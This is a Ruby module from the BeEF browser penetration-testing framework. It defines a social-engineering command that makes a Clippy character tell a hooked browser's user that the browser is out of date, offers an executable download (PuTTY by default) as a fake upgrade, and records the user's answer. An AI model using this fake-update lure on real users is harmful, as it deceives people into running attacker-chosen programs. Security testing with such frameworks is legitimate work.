#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Clippy < BeEF::Core::Command
  
  def self.options
    return [
        {'name' =>'clippydir', 'description' =>'Webdir containing clippy image', 'ui_label'=>'Clippy image', 'value' => 'http://clippy.ajbnet.com/1.0.0/'},
        {'name' =>'askusertext', 'description' =>'Text for speech bubble', 'ui_label'=>'Custom text', 'value' => 'Your browser appears to be out of date. Would you like to upgrade it?'},
        {'name' =>'executeyes', 'description' =>'Executable to download', 'ui_label'=>'Executable', 'value' => 'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'},
        {'name' =>'respawntime', 'description' =>'', 'ui_label'=>'Time until Clippy shows his face again', 'value' => '5000'},
        {'name' =>'thankyoumessage', 'description' =>'Thankyou message after downloading', 'ui_label'=>'Thankyou message after downloading', 'value' => 'Thanks for upgrading your browser! Look forward to a safer, faster web!'}
    ]
  end
  
  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    save({'answer' => @datastore['answer']})
  end
  
end
